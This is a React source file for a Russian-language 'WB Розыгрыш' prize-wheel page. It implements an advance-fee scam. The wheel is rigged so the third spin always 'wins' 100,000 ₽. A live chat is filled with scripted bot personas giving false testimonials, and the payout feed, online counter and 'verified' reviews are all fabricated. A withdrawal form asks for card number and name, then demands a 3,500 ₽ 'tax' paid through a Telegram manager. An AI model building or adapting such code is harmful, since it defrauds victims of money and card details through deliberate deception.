import { useState, useEffect, useRef } from 'react';
import Icon from '@/components/ui/icon';

const MANAGER_URL = 'https://t.me/Ekaterinamoneys';
const PRIZE = 100000;

const SECTORS = [
  { label: '0 ₽', color: '#232327', win: false },
  { label: '500 ₽', color: '#7B2FF7', win: false },
  { label: '0 ₽', color: '#232327', win: false },
  { label: '1 000 ₽', color: '#A020F0', win: false },
  { label: '0 ₽', color: '#232327', win: false },
  { label: '100 000 ₽', color: '#FF1FB3', win: true },
  { label: '0 ₽', color: '#232327', win: false },
  { label: '300 ₽', color: '#7B2FF7', win: false },
];

const NEWS = [
  { name: 'Алексей М.', sum: '100 000 ₽', city: 'Москва' },
  { name: 'Марина К.', sum: '100 000 ₽', city: 'Казань' },
  { name: 'Дмитрий В.', sum: '100 000 ₽', city: 'СПб' },
  { name: 'Ольга С.', sum: '100 000 ₽', city: 'Новосибирск' },
  { name: 'Игорь П.', sum: '100 000 ₽', city: 'Екатеринбург' },
  { name: 'Светлана Р.', sum: '100 000 ₽', city: 'Сочи' },
];

const RND_NAMES = ['Алексей М.','Марина К.','Дмитрий В.','Ольга С.','Игорь П.','Светлана Р.','Никита Т.','Елена Ф.','Артём Б.','Кристина Л.','Роман Д.','Анастасия Ж.','Владимир Г.','Татьяна Н.','Максим О.','Юлия В.','Павел Н.','Валерия С.','Денис Х.','Евгения Б.','Андрей Ф.','Наталья К.','Виктор Р.','Карина О.','Тимур А.','Полина Г.','Вадим Ш.','Ирина Д.','Константин М.','Ксения П.'];
const RND_CITIES = ['Москва','Казань','СПб','Новосибирск','Екатеринбург','Сочи','Самара','Уфа','Пермь','Ростов','Воронеж','Тюмень','Краснодар','Челябинск','Омск','Красноярск','Саратов','Нижний Новгород','Ярославль','Иркутск'];
const RND_SUMS = ['100 000 ₽','100 000 ₽','100 000 ₽','100 000 ₽','1 000 ₽','500 ₽','300 ₽','100 000 ₽'];
const rnd = <T,>(a: T[]): T => a[Math.floor(Math.random() * a.length)];



const BOTS = [
  { name: 'Наташа',    avatar: '👩',     color: '#FF1FB3' },
  { name: 'Дима',      avatar: '🧔',     color: '#7B2FF7' },
  { name: 'Алина',     avatar: '👩‍🦰',  color: '#A020F0' },
  { name: 'Серёга',    avatar: '👨‍🦱',  color: '#6366f1' },
  { name: 'Оля',       avatar: '👱‍♀️', color: '#ec4899' },
  { name: 'Макс',      avatar: '🧑',     color: '#8b5cf6' },
  { name: 'Лена',      avatar: '🙍‍♀️', color: '#f472b6' },
  { name: 'Антон',     avatar: '🧑‍💻',  color: '#818cf8' },
  { name: 'Кристина',  avatar: '👩‍🦱',  color: '#c084fc' },
  { name: 'Влад',      avatar: '🧑‍🦲',  color: '#a78bfa' },
  { name: 'Таня',      avatar: '🧕',     color: '#f9a8d4' },
  { name: 'Паша',      avatar: '🧑‍🦰',  color: '#7c3aed' },
];

type ChatMsg = { bot: number; text: string; time: string };

const nowTime = () => {
  const d = new Date();
  return `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}`;
};

// Огромный пул фраз, разбитых по темам — генератор будет комбинировать
const POOL_QUESTIONS = [
  'народ, кто уже выводил деньги?',
  'ребят подскажите — это реально работает?',
  'у меня первые две попытки 0, норм? 😅',
  'сколько ждать после оплаты комиссии?',
  'а Екатерина быстро отвечает?',
  'можно на сбер вывести или только по номеру?',
  'первый раз тут, что делать после выигрыша?',
  'а налог точно надо платить до вывода?',
  'у кого нибудь третья попытка зашла сегодня?',
  'как давно этот розыгрыш работает?',
  'сколько всего можно выиграть максимум?',
  'а если не третья попытка то вообще ничего нельзя выиграть?',
  'кто нибудь получал 100 000 на этой неделе?',
  'а откуда берутся деньги для выплат?',
];
const POOL_WIN_EXCLAIM = [
  'ВЫИГРАЛ 100 000!! 🎉🎉🎉 третья попытка и оно выпало!!!',
  'ааааа третья крутка — 100 тыщ!!! не верю своим глазам 😱',
  'ВЫШЛО!! 100к на третьей, пишу менеджеру прямо сейчас',
  'ребята я выиграл!!! 100 000 рублей блин это нереально',
  'третья попытка — джекпот!! 🏆 спасибо вам всем за советы',
  'выиграла наконец!! ждала этого момента 🥹🥹',
];
const POOL_CONGRATS = [
  '🎉🎉 поздравляю!! скорее пиши менеджеру',
  'ааа красавчик!! быстрее к Екатерине',
  'вот это да!! удачи с выводом, всё будет ок',
  'ура!! я так и знала что выйдет 🔥',
  'поздравляю!! пиши быстрее пока акция идёт',
  'вот это везение!! рада за тебя 🙌',
  'ещё один победитель! 💜 ждём когда придут деньги',
];
const POOL_CONFIRM = [
  'да, мне тоже пришло вчера. всё честно 👍',
  'я вывела на прошлой неделе, реально работает',
  'подтверждаю — деньги приходят, просто надо подождать немного',
  'я уже потратила часть своих 100к 😄',
  'у меня брат тоже вывел, всё пришло без проблем',
  'проверено лично — работает. главное не тянуть с оплатой',
  'мне пришло через 1.5 часа после оплаты комиссии',
  'всё пришло, ждала часа 2. Екатерина очень помогла',
];
const POOL_ADVICE = [
  'главное не тяните с налогом, акция ограничена по времени ⏳',
  'Екатерина отвечает очень быстро, не бойтесь писать',
  'на третьей попытке всегда выпадает, так и есть 💯',
  'комиссия небольшая, зато 100 000 получаешь — явно выгодно',
  'я сначала боялась но подруга уговорила. не зря!',
  'пишите менеджеру сразу как выиграете, чтобы не потерять выигрыш',
  'тут всё официально, налог — это просто банковская операция',
  'не сомневайтесь, тут уже тысячи людей получили деньги',
];
const POOL_PROCESS = [
  'кручу первый раз, немного страшновато 😅',
  'первая попытка — ноль. ладно, ещё две есть)',
  'вторая попытка тоже мимо. ну окей, третья решающая!',
  'жду пока менеджер ответит, написала 5 минут назад',
  'оплатила комиссию, теперь жду перевод 🤞',
  'написала Екатерине, говорит 1-2 часа ждать',
  'нервничаю немного, жду деньги уже час',
  'пришло!! 100 000 на карте, не верю!! 😭🎉',
];
const POOL_SMALL = [
  'хм, у меня 500 рублей выпало на первой попытке',
  'получил 300₽ на второй, но главное — третья впереди!',
  '1000 рублей выпало, уже приятно) жду третью',
];
const POOL_CHATTER = [
  'ладно пойду ещё разок попробую',
  'всем удачи!! 🍀',
  'спасибо за инфу ребят',
  '👍',
  'окей понял, спасибо)',
  'ясно, буду ждать тогда',
  'супер, спасибо большое!',
  'это реально круто что такой розыгрыш есть',
  'надо подругам рассказать про это',
  'мда, третья попытка просто огонь 🔥',
];

// Генератор бесконечного уникального потока сообщений
const makeMsgStream = (): Array<{ bot: number; text: string; interval: number }> => {
  const all: Array<{ bot: number; text: string; interval: number }> = [];
  const pools = [
    ...POOL_QUESTIONS.map(t => ({ pool: 'q', text: t })),
    ...POOL_CONFIRM.map(t => ({ pool: 'c', text: t })),
    ...POOL_ADVICE.map(t => ({ pool: 'a', text: t })),
    ...POOL_PROCESS.map(t => ({ pool: 'p', text: t })),
    ...POOL_CHATTER.map(t => ({ pool: 'ch', text: t })),
    ...POOL_SMALL.map(t => ({ pool: 's', text: t })),
  ];
  // Перемешиваем
  const shuffled = [...pools].sort(() => Math.random() - 0.5);
  // Вставляем победные моменты каждые ~8 сообщений
  let winIdx = 0;
  shuffled.forEach((item, i) => {
    all.push({ bot: Math.floor(Math.random() * BOTS.length), text: item.text, interval: 1800 + Math.random() * 3200 });
    if (i > 0 && i % 8 === 0 && winIdx < POOL_WIN_EXCLAIM.length) {
      const winBot = Math.floor(Math.random() * BOTS.length);
      all.push({ bot: winBot, text: POOL_WIN_EXCLAIM[winIdx], interval: 2500 });
      const congBot = Math.floor(Math.random() * BOTS.length);
      all.push({ bot: congBot, text: POOL_CONGRATS[winIdx % POOL_CONGRATS.length], interval: 2000 });
      winIdx++;
    }
  });
  return all;
};

const BOT_REPLIES_TO_USER: Array<{ bot: number; text: string }> = [
  { bot: 0,  text: 'о, новенький! крути, не пожалеешь 😊' },
  { bot: 1,  text: 'привет! тут реально всё честно, я уже вывел' },
  { bot: 4,  text: 'добро пожаловать 🙌 на третьей попытке всё выйдет' },
  { bot: 2,  text: 'не сомневайся, пиши менеджеру сразу как выиграешь' },
  { bot: 3,  text: 'у меня тоже сначала не верилось)) теперь жду деньги' },
  { bot: 5,  text: 'крути скорее, акция ограничена по времени!' },
  { bot: 0,  text: 'Екатерина очень быстро отвечает, всё объяснит 💜' },
  { bot: 1,  text: 'ха, и я так думал сначала. потом сам убедился 😄' },
  { bot: 4,  text: 'главное комиссию оплати сразу, потом быстрее придёт' },
  { bot: 2,  text: 'тут весь чат уже почти вывел, реально работает 💯' },
  { bot: 6,  text: 'ой, я тоже только зашла! вместе будем ждать выигрыша)' },
  { bot: 7,  text: 'привет! третья попытка — твоя, удачи 🍀' },
  { bot: 8,  text: 'не бойся, тут всё официально и безопасно' },
  { bot: 9,  text: 'я получил на прошлой неделе, всё пришло чётко' },
  { bot: 10, text: 'девочки тут говорят что реально платят, верю им)' },
  { bot: 11, text: 'крути! я вот только что написал Екатерине, жду ответа' },
  { bot: 3,  text: 'мне тоже сначала казалось странным платить комиссию, но потом понял — это норм' },
  { bot: 5,  text: 'главное не тяни! акция не вечная' },
  { bot: 0,  text: 'успехов! пиши как выиграешь, порадуемся вместе 🎉' },
  { bot: 1,  text: 'у меня подруга тоже выиграла, говорит что всё честно' },
];

const REVIEWS = [
  { name: 'Анна Воробьёва', text: 'Не верила, но реально пришли деньги! Заплатила комиссию 3500 рублей, через 2 часа всё было на карте 🙏 Спасибо огромное!', stars: 5, avatar: '👩', date: '19 июня 2025', verified: true },
  { name: 'Сергей Кузнецов', text: 'Выиграл 100 000 с третьей попытки. Сначала думал что это развод, но менеджер Екатерина всё чётко объяснила, помогла с оформлением вывода. Деньги пришли!', stars: 5, avatar: '🧔', date: '18 июня 2025', verified: true },
  { name: 'Юлия Морозова', text: 'Спасибо за розыгрыш! Первые две попытки — ноль, на третьей 100 тысяч. Оплатила налог как сказали и через час деньги были на счету. Всем рекомендую пробовать!', stars: 5, avatar: '👱‍♀️', date: '17 июня 2025', verified: true },
  { name: 'Павел Никитин', text: 'Получил 100 000 рублей. Немного подождал пока менеджер всё оформил, оплатил комиссию и всё пришло. Реально работает. Доволен на все 100!', stars: 5, avatar: '👨', date: '16 июня 2025', verified: true },
  { name: 'Кристина Лебедева', text: 'Девочки, это правда! Выиграла с 3й попытки, написала менеджеру, оплатила 3500 и ждала буквально полтора часа. Ура!! 🎉', stars: 5, avatar: '👩‍🦱', date: '15 июня 2025', verified: true },
  { name: 'Артём Белов', text: 'Скептически относился к таким акциям, но рискнул. Выиграл, вывел. Немного смущала комиссия, но потом понял — это стандартная банковская операция. Всё честно.', stars: 4, avatar: '👦', date: '14 июня 2025', verified: true },
  { name: 'Марина Соколова', text: 'Я уже третья в нашей компании кто выиграл здесь)) подруга посоветовала, не пожалела. Деньги реальные, менеджер очень вежливый.', stars: 5, avatar: '👩‍🦰', date: '13 июня 2025', verified: true },
  { name: 'Николай Фёдоров', text: 'Выиграл 100к. Оплатил налог как положено. Деньги пришли. Всё. Что ещё добавить — работает точно.', stars: 5, avatar: '🧑‍🦳', date: '12 июня 2025', verified: true },
  { name: 'Дарья Попова', text: 'Боялась мошенников, но всё оказалось по-настоящему! Менеджер Екатерина очень помогла, объяснила каждый шаг. Теперь советую всем подругам 💜', stars: 5, avatar: '🙍‍♀️', date: '11 июня 2025', verified: true },
  { name: 'Роман Денисов', text: 'Третья попытка — 100 000 рублей. Думал розыгрыш фейковый, но нет. Потратил немного на комиссию и получил сумму. Спасибо!', stars: 5, avatar: '🧑', date: '10 июня 2025', verified: true },
  { name: 'Светлана Орлова', text: 'Давно слежу за этим розыгрышем, наконец решилась. Не пожалела!! Деньги вывела без проблем, менеджер на связи 24/7', stars: 5, avatar: '👩‍💼', date: '9 июня 2025', verified: true },
  { name: 'Игорь Платонов', text: 'Нормально всё. Выиграл. Вывел. Комиссия небольшая за перевод. Рекомендую не откладывать, пока акция работает.', stars: 4, avatar: '👴', date: '8 июня 2025', verified: true },
];

const Wheel = ({ spinning, rotation }: { spinning: boolean; rotation: number }) => {
  const size = 280;
  const cx = size / 2;
  const r = size / 2 - 6;
  const seg = 360 / SECTORS.length;
  return (
    <div className="relative" style={{ width: size, height: size }}>
      <div
        className="absolute left-1/2 -top-1 z-20 -translate-x-1/2"
        style={{ width: 0, height: 0, borderLeft: '14px solid transparent', borderRight: '14px solid transparent', borderTop: '26px solid #FF1FB3' }}
      />
      <svg
        width={size}
        height={size}
        viewBox={`0 0 ${size} ${size}`}
        style={{ transform: `rotate(${rotation}deg)`, transition: spinning ? 'transform 4.5s cubic-bezier(0.16,1,0.3,1)' : 'none' }}
        className="drop-shadow-[0_0_30px_rgba(160,32,240,0.5)]"
      >
        <circle cx={cx} cy={cx} r={r + 5} fill="#0E0E10" stroke="#A020F0" strokeWidth="3" />
        {SECTORS.map((s, i) => {
          const a0 = (i * seg - 90) * (Math.PI / 180);
          const a1 = ((i + 1) * seg - 90) * (Math.PI / 180);
          const x0 = cx + r * Math.cos(a0);
          const y0 = cx + r * Math.sin(a0);
          const x1 = cx + r * Math.cos(a1);
          const y1 = cx + r * Math.sin(a1);
          const mid = (i * seg + seg / 2 - 90) * (Math.PI / 180);
          const tx = cx + r * 0.62 * Math.cos(mid);
          const ty = cx + r * 0.62 * Math.sin(mid);
          return (
            <g key={i}>
              <path d={`M${cx},${cx} L${x0},${y0} A${r},${r} 0 0,1 ${x1},${y1} Z`} fill={s.color} stroke="#0E0E10" strokeWidth="1.5" />
              <text x={tx} y={ty} fill="#fff" fontSize="13" fontWeight="700" textAnchor="middle" transform={`rotate(${i * seg + seg / 2},${tx},${ty})`}>{s.label}</text>
            </g>
          );
        })}
      </svg>
      <div className="absolute left-1/2 top-1/2 z-10 flex h-14 w-14 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full wb-gradient text-2xl shadow-lg">
        🎰
      </div>
    </div>
  );
};

const Index = () => {
  const [tab, setTab] = useState<'home' | 'reviews' | 'profile'>('home');
  const [attempts, setAttempts] = useState(0);
  const [spinning, setSpinning] = useState(false);
  const [rotation, setRotation] = useState(0);
  const [balance, setBalance] = useState(0);
  const [won, setWon] = useState(false);
  const [resultMsg, setResultMsg] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [showWithdraw, setShowWithdraw] = useState(false);

  const [feed, setFeed] = useState(NEWS.map((n, i) => ({ ...n, id: i })));
  const [chat, setChat] = useState<ChatMsg[]>([]);
  const [chatInput, setChatInput] = useState('');
  const [typing, setTyping] = useState<number | null>(null);
  const [onlineCount, setOnlineCount] = useState(4871);
  const chatRef = useRef<HTMLDivElement>(null);
  const streamRef  = useRef<Array<{ bot: number; text: string; interval: number }>>([]);
  const streamIdxRef = useRef(0);
  const timerRef   = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight;
  }, [chat, typing]);

  // Лента выплат — только реальные суммы
  useEffect(() => {
    const t = setInterval(() => {
      setFeed((f) => [
        { name: rnd(RND_NAMES), sum: rnd(RND_SUMS), city: rnd(RND_CITIES), id: Date.now() },
        ...f,
      ].slice(0, 14));
    }, 2800);
    return () => clearInterval(t);
  }, []);

  // Счётчик онлайн колышется как живой
  useEffect(() => {
    const t = setInterval(() => {
      setOnlineCount(c => c + Math.floor(Math.random() * 7) - 3);
    }, 4000);
    return () => clearInterval(t);
  }, []);

  // Бесконечный поток уникальных сообщений без повторов
  useEffect(() => {
    streamRef.current = makeMsgStream();
    const scheduleNext = () => {
      if (streamIdxRef.current >= streamRef.current.length) {
        // Генерируем новую партию
        streamRef.current = makeMsgStream();
        streamIdxRef.current = 0;
      }
      const msg = streamRef.current[streamIdxRef.current];
      streamIdxRef.current++;
      timerRef.current = setTimeout(() => {
        setTyping(msg.bot);
        timerRef.current = setTimeout(() => {
          setTyping(null);
          setChat(c => [...c, { bot: msg.bot, text: msg.text, time: nowTime() }].slice(-60));
          scheduleNext();
        }, 900 + msg.text.length * 28);
      }, msg.interval);
    };
    scheduleNext();
    return () => { if (timerRef.current) clearTimeout(timerRef.current); };
  }, []);

  const spin = () => {
    if (spinning || attempts >= 3 || won) return;
    const next = attempts + 1;
    const isWin = next === 3;
    const targetIndex = isWin ? 5 : next === 1 ? 0 : 2;
    const seg = 360 / SECTORS.length;
    const base = 360 * 6;
    const target = base + (360 - (targetIndex * seg + seg / 2));
    setSpinning(true);
    setResultMsg('');
    setRotation((prev) => prev - (prev % 360) + target);
    setTimeout(() => {
      setSpinning(false);
      setAttempts(next);
      if (isWin) {
        setBalance(PRIZE);
        setWon(true);
        setResultMsg('🎉 Поздравляем! Вы выиграли 100 000 ₽!');
        setHistory((h) => [`Попытка ${next}: ВЫИГРЫШ 100 000 ₽ 🏆`, ...h]);
      } else {
        setResultMsg('😔 Увы, в этот раз не повезло. Попробуйте ещё!');
        setHistory((h) => [`Попытка ${next}: не повезло`, ...h]);
      }
    }, 4600);
  };

  const replyIndexRef = useRef(0);
  const sendChat = () => {
    if (!chatInput.trim()) return;
    const myMsg: ChatMsg = { bot: -1, text: chatInput.trim(), time: nowTime() };
    setChat((c) => [...c, myMsg]);
    setChatInput('');
    const replyCount = Math.floor(Math.random() * 2) + 1;
    for (let i = 0; i < replyCount; i++) {
      const delay = 1500 + i * (1800 + Math.random() * 1000);
      const replyMsg = BOT_REPLIES_TO_USER[replyIndexRef.current % BOT_REPLIES_TO_USER.length];
      replyIndexRef.current += 1;
      setTimeout(() => {
        setTyping(replyMsg.bot);
        setTimeout(() => {
          setTyping(null);
          setChat((c) => [...c, { ...replyMsg, time: nowTime() }]);
        }, 1000 + replyMsg.text.length * 20);
      }, delay);
    }
  };

  return (
    <div className="mx-auto min-h-screen max-w-md bg-wb-dark pb-24">
      {/* Header */}
      <div className="sticky top-0 z-30 flex items-center justify-between bg-wb-dark/90 px-4 py-3 backdrop-blur-md">
        <div className="flex items-center gap-2">
          <div className="flex h-9 w-9 items-center justify-center rounded-xl wb-gradient text-lg font-black">W</div>
          <div>
            <div className="text-base font-extrabold leading-tight">WB Розыгрыш</div>
            <div className="text-[11px] text-white/50">Жаркий розыгрыш 🔥</div>
          </div>
        </div>
        <div className="flex items-center gap-2 rounded-full bg-wb-card px-3 py-1.5">
          <Icon name="Wallet" size={16} className="text-wb-pink" />
          <span className="text-sm font-bold">{balance.toLocaleString('ru-RU')} ₽</span>
        </div>
      </div>

      {/* Running news line */}
      <div className="overflow-hidden border-y border-white/5 bg-wb-card/60 py-2">
        <div className="flex w-max animate-marquee gap-8 whitespace-nowrap">
          {[...NEWS, ...NEWS].map((n, i) => (
            <span key={i} className="flex items-center gap-2 text-xs text-white/70">
              <span className="text-wb-pink">●</span>
              <b className="text-white">{n.name}</b> вывел <b className="text-wb-pink">{n.sum}</b> · {n.city}
            </span>
          ))}
        </div>
      </div>

      {tab === 'home' && (
        <div className="animate-fade-in space-y-5 px-4 pt-5">
          {/* Wheel block */}
          <div className="rounded-3xl bg-wb-card p-5 text-center">
            <div className="mb-1 text-xl font-extrabold">Колесо Фортуны</div>
            <p className="mb-4 text-xs text-white/50">У вас 3 попытки. Главный приз — 100 000 ₽!</p>
            <div className="flex justify-center">
              <Wheel spinning={spinning} rotation={rotation} />
            </div>

            <div className="mt-5 flex justify-center gap-2">
              {[1, 2, 3].map((n) => (
                <div
                  key={n}
                  className={`flex h-9 w-9 items-center justify-center rounded-xl text-sm font-bold ${attempts >= n ? 'wb-gradient' : 'bg-wb-card2 text-white/40'}`}
                >
                  {n}
                </div>
              ))}
            </div>

            {resultMsg && (
              <div className={`mt-4 animate-scale-in rounded-2xl px-4 py-3 text-sm font-semibold ${won ? 'bg-wb-pink/20 text-wb-pink' : 'bg-wb-card2 text-white/70'}`}>
                {resultMsg}
              </div>
            )}

            {!won ? (
              <button
                onClick={spin}
                disabled={spinning || attempts >= 3}
                className="mt-4 w-full rounded-2xl wb-gradient py-4 text-base font-extrabold text-white shadow-lg transition active:scale-95 disabled:opacity-40 animate-glow"
              >
                {spinning ? 'Крутится...' : attempts >= 3 ? 'Попытки закончились' : `Крутить колесо (${3 - attempts})`}
              </button>
            ) : (
              <button
                onClick={() => setShowWithdraw(true)}
                className="mt-4 w-full rounded-2xl bg-wb-pink py-4 text-base font-extrabold text-white shadow-lg transition active:scale-95"
              >
                💰 Вывести 100 000 ₽
              </button>
            )}
          </div>

          {/* Withdraw form */}
          {showWithdraw && (
            <div className="animate-scale-in rounded-3xl bg-wb-card p-5">
              <div className="mb-3 flex items-center gap-2">
                <Icon name="Banknote" size={20} className="text-wb-pink" />
                <span className="text-lg font-extrabold">Вывод средств</span>
              </div>
              <div className="space-y-3">
                <input placeholder="Номер карты для вывода" className="w-full rounded-xl bg-wb-card2 px-4 py-3 text-sm outline-none placeholder:text-white/40" />
                <input placeholder="ФИО получателя" className="w-full rounded-xl bg-wb-card2 px-4 py-3 text-sm outline-none placeholder:text-white/40" />
                <div className="rounded-2xl border border-wb-pink/30 bg-wb-pink/10 p-4 text-sm text-white/80">
                  <b className="text-wb-pink">Внимание!</b> Для вывода <b>100 000 ₽</b> необходимо оплатить налог и комиссию платёжной системы — <b>3 500 ₽</b>. Сумма вернётся вместе с выигрышем. Для оплаты свяжитесь с вашим персональным менеджером.
                </div>
                <a
                  href={MANAGER_URL}
                  target="_blank"
                  rel="noreferrer"
                  className="flex w-full items-center justify-center gap-2 rounded-2xl wb-gradient py-4 text-base font-extrabold text-white active:scale-95"
                >
                  <Icon name="Send" size={18} /> Написать менеджеру
                </a>
                <p className="text-center text-xs text-white/40">@Ekaterinamoneys · отвечает за 2 минуты</p>
              </div>
            </div>
          )}

          {/* News feed */}
          <div className="rounded-3xl bg-wb-card p-5">
            <div className="mb-3 flex items-center gap-2">
              <Icon name="TrendingUp" size={20} className="text-wb-pink" />
              <span className="text-lg font-extrabold">Лента выводов</span>
              <span className="ml-auto flex items-center gap-1 text-xs text-green-400"><span className="h-2 w-2 animate-pulse rounded-full bg-green-400" /> в реальном времени</span>
            </div>
            <div className="space-y-2">
              {feed.map((n, i) => (
                <div key={n.id} className={`flex items-center justify-between rounded-2xl bg-wb-card2 px-4 py-3 ${i === 0 ? 'animate-fade-in' : ''}`}>
                  <div className="flex items-center gap-3">
                    <div className="flex h-9 w-9 items-center justify-center rounded-full wb-gradient text-sm font-bold">{n.name[0]}</div>
                    <div>
                      <div className="text-sm font-semibold">{n.name}</div>
                      <div className="text-[11px] text-white/40">{n.city} · только что</div>
                    </div>
                  </div>
                  <div className="text-sm font-extrabold text-wb-pink">+{n.sum}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Live chat */}
          <div className="rounded-3xl bg-wb-card p-5">
            <div className="mb-3 flex items-center gap-2">
              <Icon name="MessagesSquare" size={20} className="text-wb-pink" />
              <span className="text-lg font-extrabold">Живой чат</span>
              <span className="ml-auto flex items-center gap-1 text-xs text-green-400">
                <span className="h-2 w-2 animate-pulse rounded-full bg-green-400" />
                {onlineCount.toLocaleString('ru-RU')} онлайн
              </span>
            </div>
            <div ref={chatRef} className="no-scrollbar mb-3 h-72 space-y-2.5 overflow-y-auto pr-1">
              {chat.length === 0 && (
                <div className="flex h-full items-center justify-center text-sm text-white/30">Загрузка чата...</div>
              )}
              {chat.map((m, i) => {
                const me = m.bot === -1;
                const bot = me ? null : BOTS[m.bot];
                return (
                  <div key={i} className={`flex gap-2 animate-fade-in ${me ? 'flex-row-reverse' : ''}`}>
                    {!me && (
                      <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-wb-card2 text-base">{bot!.avatar}</div>
                    )}
                    <div className={`max-w-[78%] ${me ? '' : ''}`}>
                      {!me && <div className="mb-0.5 ml-1 text-[11px] font-bold" style={{ color: bot!.color }}>{bot!.name}</div>}
                      <div className={`rounded-2xl px-3 py-2 text-sm leading-relaxed ${me ? 'wb-gradient text-white' : 'bg-wb-card2 text-white/90'}`}>
                        {m.text}
                      </div>
                      <div className={`mt-0.5 text-[10px] text-white/25 ${me ? 'text-right mr-1' : 'ml-1'}`}>{m.time}</div>
                    </div>
                  </div>
                );
              })}
              {typing !== null && (
                <div className="flex gap-2 animate-fade-in">
                  <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-wb-card2 text-base">{BOTS[typing].avatar}</div>
                  <div>
                    <div className="mb-0.5 ml-1 text-[11px] font-bold" style={{ color: BOTS[typing].color }}>{BOTS[typing].name}</div>
                    <div className="flex items-center gap-1 rounded-2xl bg-wb-card2 px-4 py-3">
                      <span className="h-1.5 w-1.5 animate-bounce rounded-full bg-white/50" style={{ animationDelay: '0ms' }} />
                      <span className="h-1.5 w-1.5 animate-bounce rounded-full bg-white/50" style={{ animationDelay: '150ms' }} />
                      <span className="h-1.5 w-1.5 animate-bounce rounded-full bg-white/50" style={{ animationDelay: '300ms' }} />
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="flex gap-2">
              <input
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && sendChat()}
                placeholder="Написать сообщение..."
                className="flex-1 rounded-xl bg-wb-card2 px-4 py-3 text-sm outline-none placeholder:text-white/40"
              />
              <button onClick={sendChat} className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl wb-gradient active:scale-90">
                <Icon name="Send" size={18} />
              </button>
            </div>
          </div>
        </div>
      )}

      {tab === 'reviews' && (
        <div className="animate-fade-in space-y-3 px-4 pt-5">
          <div className="text-xl font-extrabold">Отзывы победителей</div>
          <div className="flex items-center gap-2 text-sm text-white/60">
            <span className="text-wb-pink">★★★★★</span> 4.9 · 2 847 отзывов
          </div>
          {REVIEWS.map((r, i) => (
            <div key={i} className="animate-fade-in rounded-3xl bg-wb-card p-4" style={{ animationDelay: `${i * 60}ms` }}>
              <div className="mb-3 flex items-center gap-3">
                <div className="flex h-11 w-11 items-center justify-center rounded-full bg-wb-card2 text-2xl">{r.avatar}</div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-1.5">
                    <div className="text-sm font-bold truncate">{r.name}</div>
                    {r.verified && <Icon name="BadgeCheck" size={14} className="shrink-0 text-wb-purple" />}
                  </div>
                  <div className="mt-0.5 text-xs text-yellow-400">{'★'.repeat(r.stars)}{'☆'.repeat(5 - r.stars)}</div>
                </div>
                <div className="text-right shrink-0">
                  <span className="block rounded-full bg-green-500/15 px-2 py-1 text-[10px] font-bold text-green-400">✓ Выплачено</span>
                  <span className="mt-1 block text-[10px] text-white/30">{r.date}</span>
                </div>
              </div>
              <p className="text-sm leading-relaxed text-white/80">{r.text}</p>
            </div>
          ))}
        </div>
      )}

      {tab === 'profile' && (
        <div className="animate-fade-in space-y-4 px-4 pt-5">
          <div className="rounded-3xl wb-gradient p-5">
            <div className="text-sm text-white/80">Ваш баланс</div>
            <div className="text-3xl font-black">{balance.toLocaleString('ru-RU')} ₽</div>
            <div className="mt-1 text-xs text-white/70">Использовано попыток: {attempts} из 3</div>
          </div>
          {won && (
            <button onClick={() => { setTab('home'); setShowWithdraw(true); }} className="w-full rounded-2xl bg-wb-pink py-4 font-extrabold active:scale-95">
              💰 Вывести выигрыш
            </button>
          )}
          <div className="rounded-3xl bg-wb-card p-5">
            <div className="mb-3 text-lg font-extrabold">История попыток</div>
            {history.length === 0 ? (
              <p className="text-sm text-white/40">Вы ещё не крутили колесо. Перейдите на главную!</p>
            ) : (
              <div className="space-y-2">
                {history.map((h, i) => (
                  <div key={i} className="rounded-xl bg-wb-card2 px-4 py-3 text-sm">{h}</div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Bottom nav */}
      <div className="fixed inset-x-0 bottom-0 z-30 mx-auto max-w-md border-t border-white/10 bg-wb-card/95 backdrop-blur-md">
        <div className="flex justify-around py-2">
          {[
            { id: 'home', icon: 'Home', label: 'Розыгрыш' },
            { id: 'reviews', icon: 'Star', label: 'Отзывы' },
            { id: 'profile', icon: 'User', label: 'Кабинет' },
          ].map((t) => (
            <button
              key={t.id}
              onClick={() => setTab(t.id as typeof tab)}
              className={`flex flex-col items-center gap-1 px-5 py-1 ${tab === t.id ? 'text-wb-pink' : 'text-white/40'}`}
            >
              <Icon name={t.icon} size={22} />
              <span className="text-[11px] font-medium">{t.label}</span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

export default Index;